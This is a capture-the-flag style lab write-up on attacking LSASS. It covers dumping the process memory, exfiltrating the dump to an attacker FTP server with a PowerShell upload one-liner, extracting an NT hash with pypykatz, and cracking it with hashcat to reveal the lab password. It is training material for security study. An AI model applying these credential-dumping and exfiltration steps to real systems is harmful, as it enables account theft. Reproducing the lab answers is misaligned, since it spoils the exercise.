### Attacking LSASS

IP: 10.129.202.149

---

### Question 1:
What is the name of the executable file associated with the Local Security Authority Process?

The name of the executable file is lsass.exe, like when you would be trying to dump LSASS in a non-GUI environment.

&#x1F6A9; found **lsass.exe**.

---

### Question 2:
Apply the concepts taught in this section to obtain the password to the Vendor user account on the target. Submit the clear-text password as the answer. (Format: Case sensitive)

I start off by RDP'ing to the target like so.

```diff
+ $ xfreerdp /u:htb-student /p:HTB_@cademy_st /v:10.129.202.149
```

In the environment, I look in Task Manager and create a dump file for the Local Security Authority process.

Afterwards I create an FTP server on my attack host using pyftpdlib.

```diff
+ $ sudo python3 -m pyftpdlib --port 21 --write
```

And then I uploaded the lsass.DMP to the FTP server in PowerShell.

```diff
+ PS C:\Users\htb-student> (New-Object Net.WebClient).UploadFile('ftp://10.10.14.31/lsass.DMP', 'C:\Users\htb-student\AppData\local\temp\lsass.DMP')
```

Now on my attack host, I run the pypykatz tool against the lsass.DMP and get the NT hash for the Vendor user.

```diff
+ $ pypykatz lsa minidump lsass.DMP
```

	<snip>
	== LogonSession ==
	authentication_id 125839 (1eb8f)
	session_id 0
	username Vendor
	domainname FS01
	logon_server FS01
	logon_time 2026-10-10T01:59:06.127337+00:00
	sid S-1-5-21-2288469977-2371064354-2971934342-1003
	luid 125839
		== MSV ==
			Username: Vendor
			Domain: FS01
			LM: NA
			NT: 31f87811133bc6aaa75a536e77f64314
			SHA1: 2b1c560c35923a8936263770a047764d0422caba
			DPAPI: 0000000000000000000000000000000000000000
	<snip>

I now crack the hash using hashcat.

```diff
+ $ sudo hashcat -m 1000 31f87811133bc6aaa75a536e77f64314 /usr/share/wordlists/rockyou.txt
```

	<snip>
	31f87811133bc6aaa75a536e77f64314:Mic@123

	Session..........: hashcat
	Status...........: Cracked
	<snip>

&#x1F6A9; found **Mic@123**.
